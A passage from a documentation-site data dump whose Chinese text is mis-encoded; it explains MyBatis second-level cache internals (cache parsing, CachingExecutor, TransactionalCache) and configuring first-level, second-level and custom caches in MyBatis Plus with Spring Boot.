æå®å¨æä¸ªmapperä¸­ä½¿ç¨ --\x3e\n<mapper namespace="com.example.mymapper">\n    \x3c!-- è®¾ç½®è¯¥mapperçäºçº§ç¼å­ --\x3e\n    <cache eviction="lru" flushinterval="100000" readonly="true" size="1024"/>\n    \x3c!-- usecacheï¼è¡¨ç¤ºæ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å¦æè®¾ç½®ä¸º trueï¼åä¼ä½¿ç¨äºçº§ç¼å­ãå¯¹äº select åç´ ï¼é»è®¤å¼ä¸º trueã --\x3e\n    \x3c!-- usecache å±æ§åªè½æ§å¶æ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å®ä¸è½å³é­ä¸çº§ç¼å­ãä¸çº§ç¼å­æ¯ mybatis çé»è®¤è¡ä¸ºï¼å®æ»æ¯å¼å¯çï¼æ æ³å³é­ã --\x3e\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¶ä¸­ <cache > æ ç­¾æå¤ä¸ªå±æ§ï¼è¿éä¸ä¸ä»ç»ä¸ä¸ï¼\n\n * typeï¼å¯ä»¥æå®èªå®ä¹ç¼å­ï¼ä½æ¯è¯¥ç±»å¿é¡»å®ç°ï¼èä¸æ¯å¨ç±»å\n * evictionï¼ç¼å­åæ¶ç­ç¥ï¼é»è®¤ä¸º lruï¼least recently usedï¼ï¼ç­ç¥ä»ç»å¦ä¸ï¼\n   lruï¼æç§è®¿é®æ¶é´æåºï¼æè¿æªä½¿ç¨çæ°æ®ä¼åæ¸é¤ã\n   fifoï¼æç§æå¥æ¶é´æåºï¼åæå¥çæ°æ®åæ¸é¤ã\n   softï¼åºäºåå¾åæ¶ç®æ³ï¼å½ç³»ç»åå­ä¸è¶³æ¶ï¼ä¼ä¼åæ¸çä¸å¸¸ç¨çãå ç¨åå­è¾å¤çæ°æ®ã\n   weakï¼å¼±å¼ç¨æºå¶ï¼å½ jvm è¿è¡åå¾åæ¶æ¶ï¼å¦æå¤æ­ä¸ä¸ªå¯¹è±¡åªè¢«å¼±å¼ç¨æåï¼åä¼å°å¶åæ¶ã\n * flushintervalï¼å·æ°é´éæ¶é´ï¼è¡¨ç¤ºå¤é¿æ¶é´å·æ°ä¸æ¬¡ç¼å­ï¼åä½ä¸ºæ¯«ç§ï¼é»è®¤ä¸å·æ°ã\n * sizeï¼ç¼å­çå¤§å°ï¼è¡¨ç¤ºæå¤å¯ä»¥ç¼å­å¤å°ä¸ªå¯¹è±¡ã\n * readonlyï¼æ¯å¦åªè¯»ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºå¯ç¨ç¼å­æ´æ°æºå¶ã\n * blockingï¼æ¯å¦å¯ç¨é»å¡ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºä¸å¯ç¨ã\n\n> flushinterval é»è®¤æåµä¸ï¼mybatis éç¨åºäº perpetualcache (æ°¸ä¹ç¼å­) çç¼å­å®ç°æ¹å¼ï¼å³ç¼å­ä¼ä¸ç´ä¿å­å¨åå­ä¸­ï¼ç´å°ä¼è¯å³é­æ¶æè¢«æ¸é¤ãèå½æä»¬ä½¿ç¨åºäº ehcache çç¼å­å®ç°æ¶ï¼å¯ä»¥éè¿è®¾ç½® flushinterval å±æ§æ§å¶ç¼å­çå·æ°æ¶é´ï¼å³å®æ¶å°ç¼å­ä¸­çæ°æ®åå¥å°ç£çææä¹åå­å¨ä¸­ï¼ä»¥é¿åç¼å­è¿æãå¤±ææåå­æº¢åºç­é®é¢ã\n\nå½ mybaits å¯å¨åä¼è¯»å°äºçº§ç¼å­çéç½®ï¼åä¼è¿è¡ <cache> åºç¡çè§£æï¼å¾å° xml éé¢çå±æ§å¼ï¼å¶æ¬¡ç¨å¼ä¿¡æ¯ç»æä¸ä¸ª cache å¯¹è±¡ï¼å¹¶æè¿ä¸ª cache å¯¹è±¡ç»´æ¤å°å¨å±éç½® configuration ä¸­ï¼è¯¥å¨å±éç½®éé¢æ¯ç»´æ¤ä¸ä¸ª map ç»æçå®¹å¨\n\n// å¼å§è§£æ\nprivate void cacheelement(element context) {\n    if (context == null) return;\n    // åºç¡éç½®ä¿¡æ¯ï¼é»è®¤æ¯æ°¸æç¼å­\n    string type = context.attributevalue("type", "perpetual");\n    class<? extends cache> typeclass = typealiasregistry.resolvealias(type);\n    // ç¼å­éå fifo\n    string eviction = context.attributevalue("eviction", "fifo");\n    class<? extends cache> evictionclass = typealiasregistry.resolvealias(eviction);\n    long flushinterval = long.valueof(context.attributevalue("flushinterval"));\n    integer size = integer.valueof(context.attributevalue("size"));\n    boolean readwrite = !boolean.parseboolean(context.attributevalue("readonly", "false"));\n    boolean blocking = !boolean.parseboolean(context.attributevalue("blocking", "false"));\n\n    // è§£æé¢å¤å±æ§ä¿¡æ¯ï¼<property name="cachefile" value="/tmp/xxx-cache.tmp"/>\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // æå»ºç¼å­\n    builderassistant.usenewcache(typeclass, evictionclass, flushinterval, size, readwrite, blocking, props);\n}\n\n// æå»ºcache\npublic cache usenewcache(class<? extends cache> typeclass,\n                        class<? extends cache> evictionclass,\n                        long flushinterval,\n                        integer size,\n                        boolean readwrite,\n                        boolean blocking,\n                        properties props) {\n    // å¤æ­ä¸ºnullï¼åç¨é»è®¤å¼\n    typeclass = valueordefault(typeclass, perpetualcache.class);\n    evictionclass = valueordefault(evictionclass, fifocache.class);\n\n    // å»ºé èæ¨¡å¼æå»º cache [currentnamespace=cn.bugstack.mybatis.test.dao.iactivitydao]\n    cache cache = new cachebuilder(currentnamespace)\n            .implementation(typeclass)\n            .adddecorator(evictionclass)\n            .clearinterval(flushinterval)\n            .size(size)\n            .readwrite(readwrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // æ·»å ç¼å­\n    configuration.addcache(cache);\n    // ç»èªå·±ç»´æ¤ä¸ä¸ª cache ä»¥ä¾¿åç»­ mappedstatement ç¨å°\n    currentcache = cache;\n    return cache;\n}\n\n// æ·»å å° configurationå¨å±éç½®ç»´æ¤ç cachesä¸­\npublic class configuration {\n    // ç¼å­,å­å¨mapé\n    protected final map<string, cache> caches = new hashmap<>();\n    public void addcache(cache cache) {\n        caches.put(cache.getid(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nç¼å­è§£æè¿äºï¼ä½æ¯æä¸»è¦çè¿æ¯ <select> æ ç­¾çä¸äºï¼æ ç­¾ä¸é¢æè¿°äºå·ä½çç¼å­æ¯å¦ä½¿ç¨ï¼ç¼å­æ¯å¦æ¸é¤ï¼æä»¥è¿éè¦è§£ææ ç­¾ä¸çç¼å­ä¿¡æ¯ï¼ä¸»è¦æ¯ flushcache å usecache è¿ä¸¤ä¸ªå±æ§\n\n// è§£ææä½\npublic void parsestatementnode() {\n    string id = element.attributevalue("id");\n    // åæ°ç±»å\n    string parametertype = element.attributevalue("parametertype");\n    class<?> parametertypeclass = resolvealias(parametertype);\n    // å¤é¨åºç¨ resultmap\n    string resultmap = element.attributevalue("resultmap");\n    // ç»æç±»å\n    string resulttype = element.attributevalue("resulttype");\n    class<?> resulttypeclass = resolvealias(resulttype);\n    // è·åå½ä»¤ç±»å(select|insert|update|delete)\n    string nodename = element.getname();\n    sqlcommandtype sqlcommandtype = sqlcommandtype.valueof(nodename.touppercase(locale.english));\n\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n    boolean flushcache = boolean.parseboolean(element.attributevalue("flushcache", string.valueof(!isselect)));\n    boolean usecache = boolean.parseboolean(element.attributevalue("usecache", string.valueof(isselect)));\n\n    // è·åé»è®¤è¯­è¨é©±å¨å¨\n    class<?> langclass = configuration.getlanguageregistry().getdefaultdriverclass();\n    languagedriver langdriver = configuration.getlanguageregistry().getdriver(langclass);\n\n    // è§£æ<selectkey> step-14 æ°å¢\n    processselectkeynodes(id, parametertypeclass, langdriver);\n\n    // è§£ææsqlsourceï¼dynamicsqlsource/rawsqlsource\n    sqlsource sqlsource = langdriver.createsqlsource(configuration, element, parametertypeclass);\n\n    // å±æ§æ è®°ãä»å¯¹ insert æç¨ã, mybatis ä¼éè¿ getgeneratedkeys æèéè¿ insert è¯­å¥ç selectkey å­åç´ è®¾ç½®å®çå¼ step-14 æ°å¢\n    string keyproperty = element.attributevalue("keyproperty");\n\n    keygenerator keygenerator = null;\n    string keystatementid = id + selectkeygenerator.select_key_suffix;\n    keystatementid = builderassistant.applycurrentnamespace(keystatementid, true);\n\n    if (configuration.haskeygenerator(keystatementid)) {\n        keygenerator = configuration.getkeygenerator(keystatementid);\n    } else {\n        keygenerator = configuration.isusegeneratedkeys() && sqlcommandtype.insert.equals(sqlcommandtype) ? new jdbc3keygenerator() : new nokeygenerator();\n    }\n    // è°ç¨å©æç±»\n    builderassistant.addmappedstatement(id,\n            sqlsource,\n            sqlcommandtype,\n            parametertypeclass,\n            resultmap,\n            resulttypeclass,\n            flushcache,\n            usecache,\n            keygenerator,\n            keyproperty,\n            langdriver);\n}\n\n// æä¿¡æ¯æ·»å å° mappedstatementå¯¹è±¡\npublic mappedstatement addmappedstatement(\n        string id,\n        sqlsource sqlsource,\n        sqlcommandtype sqlcommandtype,\n        class<?> parametertype,\n        string resultmap,\n        class<?> resulttype,\n        boolean flushcache,\n        boolean usecache,\n        keygenerator keygenerator,\n        string keyproperty,\n        languagedriver lang\n) {\n    // ç»idå ä¸namespaceåç¼ï¼cn.bugstack.mybatis.test.dao.iuserdao.queryuserinfobyid\n    id = applycurrentnamespace(id, false);\n    //æ¯å¦æ¯selectè¯­å¥\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n\n    mappedstatement.builder statementbuilder = new mappedstatement.builder(configuration, id, sqlcommandtype, sqlsource, resulttype);\n    statementbuilder.resource(resource);\n    statementbuilder.keygenerator(keygenerator);\n    statementbuilder.keyproperty(keyproperty);\n\n    // ç»ææ å°ï¼ç» mappedstatement#resultmaps\n    setstatementresultmap(resultmap, resulttype, statementbuilder);\n    // ç»´æ¤ç¼å­ä¿¡æ¯\n    setstatementcache(isselect, flushcache, usecache, currentcache, statementbuilder);\n    mappedstatement statement = statementbuilder.build();\n    // æ å°è¯­å¥ä¿¡æ¯ï¼å»ºé å®å­æ¾å°éç½®é¡¹ä¸­\n    configuration.addmappedstatement(statement);\n    return statement;\n}\n\n// ç»statementæ·»å ç¼å­ä¿¡æ¯\nprivate void setstatementcache(\n        boolean isselect,\n        boolean flushcache,\n        boolean usecache,\n        cache cache,\n        mappedstatement.builder statementbuilder) {\n    flushcache = valueordefault(flushcache, !isselect);\n    usecache = valueordefault(usecache, isselect);\n    statementbuilder.flushcacherequired(flushcache);\n    statementbuilder.usecache(usecache);\n    statementbuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\nå¨å·ä½ç addmappedstatement çæ¶åï¼å¯ä»¥çå°ä¼å¾å°ä¸ä¸ª mappedstatement å¯¹è±¡ï¼è¯¥å¯¹è±¡å°±æ¯å°è£äº sql æ ç­¾çææä¿¡æ¯ï¼å¨ setstatementcache æ¹æ³ä¸­ï¼ä¸ä»åªæ flushcacheåusecache è¿è¡äºè®¾ç½®ï¼é¢å¤çè¿å¸¦æä¸ä¸ª cache ï¼è¯¥ cache å°±æ¯å¨è°ç¨ usenewcache æ¹æ³ï¼åé¨èµå¼ç currentcache ï¼ä»ä»¬çæ¹æ³æ¯å¨åä¸ä¸ªç±»ä¸­ï¼å æ­¤å¯ä»¥ä½¿ç¨ãè¿æ · mappedstatement å¯¹è±¡ä¹å°±æ¥æäº <cache> æ ç­¾çè½åï¼å°æ­¤è§£æå®æ¯\n\n\n# åå¤\n\nåä¸çº§ç¼å­ä¸æ ·ï¼é½æ¯å¨ opensession çæ¶åå»åå®ä¾åï¼ä½æ¯ä¸åçæ¯ï¼äºçº§ç¼å­ä¼å¨ä¸çº§ç¼å­ä¸è¿è¡ä¸ä¸ªè£é¥°ï¼å¹¶ä¸é¦è¦ä¼å¤æ­æ¯å¦åè®¸å¼å¯äºçº§ç¼å­ã\n\nif (cacheenabled) {\n    executor = new cachingexecutor(executor);\n}\n\n\n1\n2\n3\n\n\ncachingexecutor æ¥æ¶ executor ï¼å¹¶å¯¹å¶è¿è¡åè£ï¼åé¨æ¹æ³ä¾ç¶è°ç¨çæ¯ baseexecutor çç¸å³æ¹æ³ã cachingexecutor åé¨è¿ç»´æ¤äº transactionalcachemanager äºå¡ç¼å­ç®¡çå¨ï¼è¯¥ç®¡çå¨åé¨ç»´æ¤ map<cache, transactionalcache> ï¼ transactionalcache åé¨åç»´æ¤äº cache ä»¥å entriesmissedincache å entriestoaddoncommit\n\n\n# æ§è¡\n\npublic class cachingexecutor implements executor {\n\n    private logger logger = loggerfactory.getlogger(cachingexecutor.class);\n    private executor delegate;\n    // äºå¡ç¼å­ç®¡çå¨\n    private transactionalcachemanager tcm = new transactionalcachemanager();\n\n    public cachingexecutor(executor delegate) {\n        this.delegate = delegate;\n        delegate.setexecutorwrapper(this);\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        return delegate.update(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        cache cache = ms.getcache();\n        if (cache != null) {\n            flushcacheifrequired(ms);\n            if (ms.isusecache() && resulthandler == null) {\n                @suppresswarnings("unchecked")\n                list<e> list = (list<e>) tcm.getobject(cache, key);\n                if (list == null) {\n                    list = delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n                    // cacheï¼ç¼å­éåå®ç°ç±»ï¼fifo\n                    // keyï¼åå¸å¼ [mappedstatementid + offset + limit + sql + queryparams + environment]\n                    // listï¼æ¥è¯¢çæ°æ®\n                    tcm.putobject(cache, key, list);\n                }\n                // æå°è°è¯æ¥å¿ï¼è®°å½äºçº§ç¼å­è·åæ°æ®\n                if (logger.isdebugenabled() && cache.getsize() > 0) {\n                    logger.debug("äºçº§ç¼å­ï¼{}", json.tojsonstring(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. è·åç»å®sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. åå»ºç¼å­key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public transaction gettransaction() {\n        return delegate.gettransaction();\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            if (forcerollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forcerollback);\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        delegate.clearlocalcache();\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        return delegate.createcachekey(ms, parameterobject, rowbounds, boundsql);\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        throw new unsupportedoperationexception("this method should not be called");\n    }\n\n    private void flushcacheifrequired(mappedstatement ms) {\n        cache cache = ms.getcache();\n        if (cache != null && ms.isflushcacherequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class transactionalcachemanager {\n\n    private map<cache, transactionalcache> transactionalcaches = new hashmap<>();\n\n    public void clear(cache cache) {\n        gettransactionalcache(cache).clear();\n    }\n\n    /**\n     * å¾å°æä¸ªtransactionalcacheçå¼\n     */\n    public object getobject(cache cache, cachekey key) {\n        return gettransactionalcache(cache).getobject(key);\n    }\n\n    public void putobject(cache cache, cachekey key, object value) {\n        gettransactionalcache(cache).putobject(key, value);\n    }\n\n    /**\n     * æäº¤æ¶å¨é¨æäº¤\n     */\n    public void commit() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.commit();\n        }\n    }\n\n    /**\n     * åæ»æ¶å¨é¨åæ»\n     */\n    public void rollback() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.rollback();\n        }\n    }\n\n    private transactionalcache gettransactionalcache(cache cache) {\n        transactionalcache txcache = transactionalcaches.get(cache);\n        if (txcache == null) {\n            txcache = new transactionalcache(cache);\n            transactionalcaches.put(cache, txcache);\n        }\n        return txcache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class transactionalcache implements cache {\n\n    private cache delegate;\n    // commit æ¶è¦ä¸è¦æ¸ç¼å­\n    private boolean clearoncommit;\n    // commit æ¶è¦æ·»å çåç´ \n    private map<object, object> entriestoaddoncommit;\n    private set<object> entriesmissedincache;\n\n    public transactionalcache(cache delegate) {\n        // delegate = fifocache\n        this.delegate = delegate;\n        // é»è®¤ commit æ¶ä¸æ¸ç¼å­\n        this.clearoncommit = false;\n        this.entriestoaddoncommit = new hashmap<>();\n        this.entriesmissedincache = new hashset<>();\n    }\n\n    @override\n    public string getid() {\n        return delegate.getid();\n    }\n\n    @override\n    public int getsize() {\n        return delegate.getsize();\n    }\n\n    @override\n    public object getobject(object key) {\n        // keyï¼cachekey æ¼è£åçåå¸ç \n        object object = delegate.getobject(key);\n        if (object == null) {\n            entriesmissedincache.add(key);\n        }\n        return clearoncommit ? null : object;\n    }\n\n    @override\n    public void putobject(object key, object object) {\n        entriestoaddoncommit.put(key, object);\n    }\n\n    @override\n    public object removeobject(object key) {\n        return null;\n    }\n\n    @override\n    public void clear() {\n        clearoncommit = true;\n        entriestoaddoncommit.clear();\n    }\n\n    public void commit() {\n        if (clearoncommit) {\n            delegate.clear();\n        }\n        flushpendingentries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockmissedentries();\n        reset();\n    }\n\n    private void reset() {\n        clearoncommit = false;\n        entriestoaddoncommit.clear();\n        entriesmissedincache.clear();\n    }\n\n    /**\n     * å·æ°æ°æ®å° mappedstatement#cache ä¸­ï¼ä¹å°±æ¯ææ°æ®å¡«åå° mapper xml çº§å«ä¸ã\n     * flushpendingentries æ¹æ³æäºå¡ç¼å­ä¸çæ°æ®ï¼å¡«åå° fifocache ä¸­ã\n     */\n    private void flushpendingentries() {\n        for (map.entry<object, object> entry : entriestoaddoncommit.entryset()) {\n            delegate.putobject(entry.getkey(), entry.getvalue());\n        }\n        for (object entry : entriesmissedincache) {\n            if (!entriestoaddoncommit.containskey(entry)) {\n                delegate.putobject(entry, null);\n            }\n        }\n    }\n\n    private void unlockmissedentries() {\n        for (object entry : entriesmissedincache) {\n            delegate.putobject(entry, null);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\nå¶å®ä¸é¢é¥¶äºä¸åä¸æ¥ï¼æç»æä½çæ¯ mappedstatement ç»´æ¤ç cache å¯¹è±¡ï¼ mappedstatement æ¯è¢«å¨å± configuration å¨ç¼å­çï¼æä»¥æ¥è¯¢ç»æä¸ä¼æ¸é¤ mappedstatement å¯¹è±¡åç¼å­ä¿¡æ¯ï¼åªæå½è§¦å updateï¼commitï¼rollback ç­æä¼æ¸é¤ mappedstatement éç»´æ¤çç¼å­ä¿¡æ¯',charsets:{cjk:!0}},{title:"MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­",frontmatter:{title:"MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/303/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/303.MyBatis%20Plus+Spring%20Boot%20%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BC%93%E5%AD%98.html",relativePath:"01.æ¡æ¶/02.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­.md",key:"v-0e7babe4",path:"/mybatis/mybatis/303/",headers:[{level:2,title:"ä¸çº§ç¼å­",slug:"ä¸çº§ç¼å­",normalizedTitle:"ä¸çº§ç¼å­",charIndex:2},{level:2,title:"äºçº§ç¼å­",slug:"äºçº§ç¼å­",normalizedTitle:"äºçº§ç¼å­",charIndex:667},{level:2,title:"èªå®ä¹ç¼å­",slug:"èªå®ä¹ç¼å­",normalizedTitle:"èªå®ä¹ç¼å­",charIndex:1802}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä¸çº§ç¼å­ äºçº§ç¼å­ èªå®ä¹ç¼å­",content:'# ä¸çº§ç¼å­\n\né¦åéè¦å¨ application.yml ä¸­è¿è¡éç½®\n\nmybatis-plus:\n  # æå®å·ä½xmlè·¯å¾ å¨è·¯å¾\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*Mapper.xml\n  # è®¾ç½®å®ä½è·¯å¾ä½ç½®\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # å¼å¯ä¸çº§ç¼å­,é»è®¤æ¯å¼å¯ç\n    local-cache-scope: SESSION\n  GlobalConfig:\n    # å³é­ banner ææ\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå¶æ¬¡å¨æ¥è¯¢æ¹æ³ä¸ä½¿ç¨æ³¨è§£ @Transactionalï¼@Transactional ä»£è¡¨å°±åä¸ä¸ª sessionï¼æä»¬å¨è¿éé¢éå¤æ§è¡æ¥è¯¢ï¼å°±åªä¼æ¥è¯¢ä¸æ¬¡\n\n@Transactional\n@GetMapping("/testOne")\npublic UserBean testOne(){\n    UserBean userBean = cacheOneMapper.testOne();\n    userBean = null;\n    userBean = cacheOneMapper.testOne();\n    return userBean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# äºçº§ç¼å­\n\né¦åï¼å¨ application.yml éç½®æä»¶ä¸­æ·»å å¦ä¸éç½®ï¼\n\nmybatis-plus:\n  configuration:\n    # å¼å¯äºçº§ç¼å­\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\nå¿é¡»å®ç°è¦ç»å¯¹è±¡è¿è¡ Serializableï¼ä¾å¦ï¼\n\n@Data\n@TableName("user")\npublic class UserBean implements Serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\næåï¼éè¦å¨ Mapper æ¥å£ä¸­ä½¿ç¨ @CacheNamespace ï¼ä½¿ç¨è¯¥æ³¨è§£å¯ä»¥æ¹ä¾¿å°ä¸ºæ¯ä¸ª Mapper æ¥å£å®ä¹ç¬ç«çç¼å­ç©ºé´ï¼å¹¶æå®ä¸åçç¼å­å®ç°åç¼å­ç­ç¥ï¼ä»èæ´å¥½å°æ§å¶ç¼å­ææã\n\n@Mapper\n@CacheNamespace(eviction = FifoCache.class)\npublic interface CacheTwoMapper extends BaseMapper<UserBean> {\n    List<UserBean> testAll();\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nä½å¦æ Mapper æ¥å£æå¯¹åºç XMLï¼åéè¦å¨ XML æè¿° cacheï¼ä½¿ç¨æ³¨è§£ @CacheNamespace å°±ä¼å¤±æï¼ä¸¤ä¸ªä¸èµ·å­å¨å°±ä¼æ¥é\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.CacheTwoMapper">\n    <cache eviction="fifo"/>\n    <select id="testAll" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user\n    </select>\n    <select id="testOne" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\näºçº§ç¼å­é»è®¤æåµä¸æ¯ä½¿ç¨ MyBatis èªå¸¦ç PerpetualCache å®ç°ï¼å¯ä»¥éè¿éç½®æä»¶ä¸­çå±æ§æ¥è®¾ç½®ç¼å­å®ç°ç±»åå¶ä»åæ°ãå¦å¤ï¼å¨ä½¿ç¨äºçº§ç¼å­æ¶ï¼\néè¦æ³¨æé¿åæ°æ®å¹¶åæ´æ°å¯¼è´èæ°æ®çé®é¢ï¼å¯ä»¥éè¿è®¾ç½®ç¼å­å·æ°æ¶é´ç­æ¹å¼æ¥è§£å³è¿ä¸ªé®é¢ã\n\n\n# èªå®ä¹ç¼å­\n\nå¦æä½ æ¯ä½åºç¨ç¨åºçè¯ï¼ä½¿ç¨ä»¥ä¸çéç½®æ¹å¼æ²¡æé®é¢ï¼ä½å¦æä½ æ¯åå¸å¼æå¾®æå¡ï¼é£ä¹å°±ä¼é ææ°æ®ä¸ä¸è´çé®é¢ï¼æ­¤æ¶æä»¬éè¦åå©å¶ä»ç¼å­ï¼æ¯å¦ Redis æ¥ç¼å­æä»¬çæ¥è¯¢æ°æ®ãèªå®ä¹ç¼å­ä¹åªæ¯å¨äºçº§ç¼å­åºç¡ä¸çæ¹é ï¼æä»¥è§ååäºçº§ç¼å­ä¸æ ·ã\n\nå®ç° org.apache.ibatis.cache.Cache ç±»\n\npublic class MyCache implements Cache {\n\n    /**\n     * id ä¼æ¯ mapper æ¥å£çåç§°\n     */\n    private final String id;\n\n    /**\n     * å¯ä»¥æ¿æ¢ä¸º Redis\n     */\n    private Map<Object, Object> cache = new ConcurrentHashMap<Object, Object>();\n\n    public MyCache(String id) {\n        this.id = id;\n    }\n\n    /**\n     * ç¼å­å¯ä¸æ è¯\n     * @return\n     */\n    @Override\n    public String getId() {\n        return id;\n    }\n\n    /**\n     * å°é®å¼å¯¹æ¾å¥ç¼å­ä¸­\n     * @param key\n     * @param value\n     */\n    @Override\n    public void putObject(Object key, Object value) {\n        System.out.println("æ·»å -èªå®ä¹ç¼å­: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­è·åæå®é®çå¼\n     * @param key\n     */\n    @Override\n    public Object getObject(Object key) {\n        System.out.println("æ¥è¯¢-èªå®ä¹ç¼å­: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­ç§»é¤æå®é®çå¼\n     * @param key\n     */\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * æ¸ç©ºç¼å­\n     */\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * 